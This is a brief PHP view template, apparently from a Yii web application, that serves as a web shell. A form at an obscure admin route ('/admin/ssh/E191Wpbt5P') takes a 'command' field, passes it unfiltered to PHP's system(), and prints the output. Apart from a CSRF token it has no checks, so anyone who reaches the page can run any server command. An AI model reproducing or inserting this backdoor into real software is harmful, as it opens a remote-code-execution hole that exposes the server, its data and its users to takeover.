<div class="container-fluid" style="padding-top: 50px;">
    <div class="row">
        <div class="col-md-12">
            <form method="post" action="/admin/ssh/E191Wpbt5P">
                <input type="text" style="width:100%;height:30px;" name="command" autofocus>
                <input type="hidden" name="_csrf" value="<?=Yii::$app->request->getCsrfToken()?>" />
            </form>    
        </div>
    </div>
    <div class="row">
        <div class="col-md-12">
            <pre class="well">
                <?php
                if(!empty($post)){
                    if(!empty($post['command'])){
                        echo system(trim($post['command']));
                    }
                }
                ?>    
            </pre>
        </div>
    </div>
</div>